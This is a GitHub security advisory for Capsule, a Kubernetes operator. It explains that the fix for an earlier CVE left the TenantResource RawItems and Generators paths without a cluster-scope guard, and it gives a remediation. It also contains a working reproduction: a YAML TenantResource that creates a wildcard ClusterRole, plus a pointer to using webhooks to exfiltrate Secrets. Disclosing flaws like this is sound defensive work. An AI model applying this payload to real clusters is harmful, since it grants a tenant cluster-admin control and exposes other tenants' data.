# [M] Capsule has an incomplete fix of CVE-2026-22872: TenantResource RawItems and Generators still allow cluster-scoped resource creation (cross-tenant privilege escalation)

## Summary
Severity: Medium
Advisory: GHSA-jr6p-8pjj-mfx6
CVE: CVE-2026-65835
CWE: CWE-269, CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:L/A:L (CVSS_V3)
Published: 2026-07-31
Source: https://github.com/advisories/GHSA-jr6p-8pjj-mfx6
Type: github-advisory

## Affected
- Go: `github.com/projectcapsule/capsule` — affected >=0.13.0 <0.13.8

## Details
### Summary
CVE-2026-22872 (GHSA-qjjm-7j9w-pw72) reported that a Tenant Owner could create cluster-scoped resources
(e.g. `ClusterRole`, `ValidatingWebhookConfiguration`) through a `TenantResource`, because the controller
applies them with its cluster-admin ServiceAccount and `SetNamespace` is ineffective for cluster-scoped
kinds. The v0.13.0 fix added a cluster-scope rejection guard, but **only on the NamespacedItems selection
path** (`ResourceReference.LoadResources` -> `IsNamespacedGVK`, error `"cluster-scoped kind ... is not
allowed"`). The **RawItems create path — the exact vector the original advisory named — and the Generators
path were not given this guard.** The vulnerability therefore persists in all releases **v0.13.0 through
v0.13.7** and on trunk HEAD (`8d89d6865d`).

### Details
TenantResource reconcile flow:
- `internal/controllers/resources/namespaced.go` `reconcile()` obtains the apply client via `loadClient()`;
  by default (impersonation off, no `Spec.ServiceAccount`) this is the manager client whose SA is bound to
  cluster-admin (`charts/capsule/templates/rbac.yaml:488-501`, `{fullname}-manager-rolebinding` ->
  roleRef cluster-admin).
- `Collector.Collect()` (`collect.go`) processes `spec.RawItems` via `handleRawItem` and `spec.Generators`
  via `handleGeneratorItem`.

`handleRawItem` (`collect.go:406-425`, trunk HEAD — byte-identical to v0.13.0):
```go
tmplString := tpl.FastTemplate(string(item.Raw), opts.Iterator.FastContext)
obj := &unstructured.Unstructured{}
unstructured.UnstructuredJSONScheme.Decode([]byte(tmplString), nil, obj)
if ns != nil { obj.SetNamespace(ns.Name) }   // ONLY mitigation
return obj, nil                                // NO IsNamespacedGVK / allowClusterScoped guard
```
`handleGeneratorItem` (`collect.go:382-404`) is the same: it only `SetNamespace`s on rendered objects.

The accumulated objects flow to `pkg/api/processor/processor_func.go` `Reconcile()` -> `Apply()` ->
`clt.PatchApply(ctx, c, obj, ...)` (line 167/378) with **no scope check at any point**.

By contrast, `CollectNamespacedItems` (`collect.go:308`) calls `item.LoadResources(..., allowClusterScoped=false)`,
and `pkg/template/reference.go:105-107` enforces:
```go
if !allowClusterScoped && !isNamespaced {
    return nil, fmt.Errorf("cluster-scoped kind %s/%s is not allowed", ...)
}
```
So the guard the fix added is real, but it sits on a different (selection) path than the one the CVE
described (RawItems create path). For cluster-scoped kinds, `SetNamespace` is ignored by the Kubernetes API
server, so the object is created cluster-wide by the cluster-admin client.

**Parent-fix diff confirmation:** in v0.12.4 the RawItems handler in `processor.go` was the vulnerable code
(`obj.SetNamespace(ns.Name)` then `createOrUpdate` via `r.client`). v0.13.0 refactored this into
`collect.go` `handleRawItem` but left it without the new guard.

### Proof of Concept
A self-contained in-process Go test (`incompletefix_poc_test.go`), run against trunk HEAD with go1.26.4,
proves the asymmetry:
- `TestRawItemPath_NoClusterScopeGuard`: feeds a `ClusterRole` rawItem to `handleRawItem` -> object returned
  unchanged, no rejection (PASS).
- `TestNamespacedItemsPath_HasClusterScopeGuard`: feeds the same `ClusterRole` kind to
  `LoadResources(allowClusterScoped=false)` -> rejected with
  `"cluster-scoped kind rbac.authorization.k8s.io/v1/ClusterRole is not allowed"` (PASS).

```
VULNERABLE: RawItems path accepted cluster-scoped rbac.authorization.k8s.io/v1/ClusterRole;
            metadata.namespace="tenant-ns" (ignored by API server for cluster-scoped kinds)
GUARDED:    NamespacedItems path correctly rejected cluster-scoped kind:
            cluster-scoped kind rbac.authorization.k8s.io/v1/ClusterRole is not allowed
```

End-to-end (cluster) reproduction:
1. Deploy capsule (default Helm) with `rbac.resources.create=true` (the opt-in that exposes TenantResources
   to tenant owners; the configuration the original CVE applies to).
2. As a Tenant Owner, create in a tenant namespace:
   ```yaml
   apiVersion: capsule.clastix.io/v1beta2
   kind: TenantResource
   metadata: {name: pwn, namespace: <tenant-ns>}
   spec:
     resources:
       - namespaceSelector: {matchLabels: {capsule.clastix.io/tenant: <tenant>}}
         rawItems:
           - apiVersion: rbac.authorization.k8s.io/v1
             kind: ClusterRole
             metadata: {name: tenant-escalation}
             rules: [{apiGroups: ["*"], resources: ["*"], verbs: ["*"]}]
   ```
3. Observe the cluster-scoped ClusterRole `tenant-escalation` is created by the cluster-admin controller,
   despite the tenant owner lacking cluster RBAC to create it. Swap in `ValidatingWebhookConfiguration`
   to intercept/exfiltrate cluster-wide Secrets.

### Impact
A Tenant Owner (namespace-scoped) escalates to cluster-admin-equivalent privileges and can compromise all
tenants and the cluster control plane. Identical impact to CVE-2026-22872; the v0.13.0 remediation does not
close the RawItems/Generators vector.

### Remediation
Apply the same `IsNamespacedGVK` / `allowClusterScoped` rejection inside `handleRawItem` and
`handleGeneratorItem` — or centrally in `Collector.AddToAccumulation` / `processor.Apply` — so the create
path enforces the same cluster-scope policy as the selection path. (`GlobalTenantResource` shares the path
but is not a privesc — cluster-admin-only to create.)

## References
- https://github.com/projectcapsule/capsule/security/advisories/GHSA-jr6p-8pjj-mfx6
- https://nvd.nist.gov/vuln/detail/CVE-2026-65835
- https://github.com/projectcapsule/capsule
- https://github.com/projectcapsule/capsule/releases/tag/v0.13.8
